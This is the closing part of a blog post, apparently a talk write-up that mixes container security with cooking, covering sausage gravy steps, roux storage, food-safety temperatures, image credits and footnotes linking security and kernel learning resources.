1. Cool once flour reaches the desired color.

Store in an airtight container in the refrigerator for a month or so.  [Recipe link](../../recipes/roux/) for more information.  Here's a picture of roux cooked to perfection for gumbo (chocolate-y brown):

![roux](/assets/graphics/2024-03-24-containers-and-gravy/roux.webp){: .shadow .rounded-10}
_roux darkening, clockwise from top left_

### Sawmill sausage gravy

Let’s make it a little more difficult and remove the ability to use a blender.  The texture of breakfast sausage is critical to a good sawmill gravy!  [Recipe link](../../recipes/sausage-gravy/) for ingredients, directions, and more information.

| Picture | Steps |
| :--- | :--- |
| ![sawmill-1](/assets/graphics/2024-03-24-containers-and-gravy/sawmill-1.jpg){: .shadow .rounded-10} | Cut the casings off the sausage.<br>If it’s lean, add a bit of fat to the pan.<br>You can always add more later!<br>Turn stove to medium heat, working sausage apart with spatula. |
| ![sawmill-2](/assets/graphics/2024-03-24-containers-and-gravy/sawmill-2.jpg){: .shadow .rounded-10} | Somewhere around the sausage being halfway cooked, add the flour. |
| ![sawmill-3](/assets/graphics/2024-03-24-containers-and-gravy/sawmill-3.jpg){: .shadow .rounded-10} | Stir.<br>The flour will start to brown a bit too.<br>It’s coating the sausage and mixing with fat in the pan.<br>You don’t want dry flour.<br>If it’s dry, add a little more fat. |
| ![sawmill-4](/assets/graphics/2024-03-24-containers-and-gravy/sawmill-4.jpg){: .shadow .rounded-10} | Pour the milk in.<br>It’ll look underwhelming and thin to start. |
| ![sawmill-5](/assets/graphics/2024-03-24-containers-and-gravy/sawmill-5.jpg){: .shadow .rounded-10} | Spoon test:<br>1. Stir your sauce.<br>2. It should coat the back of the spoon.<br>3. Drawing a line with your finger should stay clear and well-defined.<br><br>The spoon test is "meh" after a minute or two. |
| ![sawmill-6](/assets/graphics/2024-03-24-containers-and-gravy/sawmill-6.jpg){: .shadow .rounded-10} | But give it another few minutes ...<br>Stir while you make other things.<br>🪄MAGIC! 🪄 |

Here's what it looks like once it's ready to serve:

{% include embed/youtube.html id='9zYIGlS6smM' %}

Refrigerate leftovers for a day or three, reheat in a saucepan.

## Gravy container security

![gravy-spill](/assets/graphics/2024-03-24-containers-and-gravy/gravy-spill.png){: .w-75 .shadow .rounded-10}

![food-safety-temps](/assets/graphics/2024-03-24-containers-and-gravy/food-safety.png){: .w-50 .shadow .rounded-10 .right}

Lastly, let's talk a moment about the security of your gravy.

Above is a gravy boat.  It's used for serving gravy, but it's only good for transportation around the dinner table.

Gravy can be a fantastic breeding ground for the types of bacteria that cause food poisoning.  While it's usually got a reasonable salt content that can hinder some spoilage, it's also got plenty of starch and not acidic.  It's usually served at a temperature that's perfect for bacteria to grow.  The [USDA](https://www.fsis.usda.gov/food-safety/safe-food-handling-and-preparation/food-safety-basics/danger-zone-40f-140f) recommends keeping hot foods hot and cold foods cold - avoiding the "danger zone" between 40°F and 140°F (4°C and 60°C).

If you want to go farther than the distance between your kitchen and your table, you'll want a thermos.  Choose to transport it hot if you're not going far, but default to transporting it cold and reheating when you get there.

## Conclusions

Eat good food and ship good software - simple techniques go a long way.

Keeping it fresh, both for food and application security, is crucial to success.

![gravy-boat](/assets/graphics/2024-03-24-containers-and-gravy/gravy-ship-at-sea.png){: .w-75 .shadow .rounded-10}

---

## Image credits

- Fire ants in the wild, <https://www.fws.gov/media/fire-ant-raft-cc>
- Fire ants in the lab, <https://www.pnas.org/doi/epdf/10.1073/pnas.1016658108>

🤖 I had way too much fun playing with AI image generators in the making of this talk.

## Disclosure

I work at Chainguard as a solutions engineer at the time of writing this.  All opinions are my own.

## Footnotes

[^vmescapes]: Escaping a virtual machine is still quite possible, but is both considered more difficult and not today's topic.  Here's an example of a critical vulnerability from earlier this month in VMware's virtualization products - [VMSA-2024-0006.1](https://www.vmware.com/security/advisories/VMSA-2024-0006.html)
[^scope]: This was a very high-level overview of the history of containers.  Container orchestrators like [Kubernetes](https://kubernetes.io/), [OpenShift](https://www.redhat.com/en/technologies/cloud-computing/openshift), and [Docker Swarm](https://docs.docker.com/engine/swarm/) are not relevant to today's topic.
[^color]: Red Hat published a [coloring book on SELinux](https://developers.redhat.com/e-books/selinux-coloring-book) that remains one of the most delightful ways to understand how mandatory access control works.
[^notk8s]: We're talking about a kernel namespace, which is a low-level concept that wraps system resources in such a way that they are shared but appear dedicated.  Not at all confusing, but a "namespace" in Kubernetes is a high-level abstraction commonly used to divide a cluster's resources among several applications.
[^versions]: There's two different versions to be aware of here, but the differences between them are way outside the scope of this talk.
[^kab]: If you want to learn more about the art and science of baking, I've found King Arthur Baking's [website](https://www.kingarthurbaking.com/blog/category/tips-and-techniques) and [book](https://shop.kingarthurbaking.com/items/king-arthur-bakers-companion) to be both approachable and inspiring - am a big fan!
[^job]: That's as close as we're getting to my day job in this talk.
[^syscalls]: System calls and application/kernel interfaces are _way_ beyond the scope of this talk.  If you want to learn more, I found this [interactive Linux kernel diagram](https://makelinux.github.io/kernel/map/) to be super helpful!  [The Linux Foundation](https://www.linuxfoundation.org/) also holds a training course on the [Beginner's Guide to Linux Kernel Development](https://training.linuxfoundation.org/training/a-beginners-guide-to-linux-kernel-development-lfd103/).
[^sudo]: Tiny amendment to that - most folks are just using `sudo run` or `--privileged` or `--cap-add=SYS_ADMIN` to get around the permissions issues.  I'm instead demonstrating the minimal permissions needed to escape.
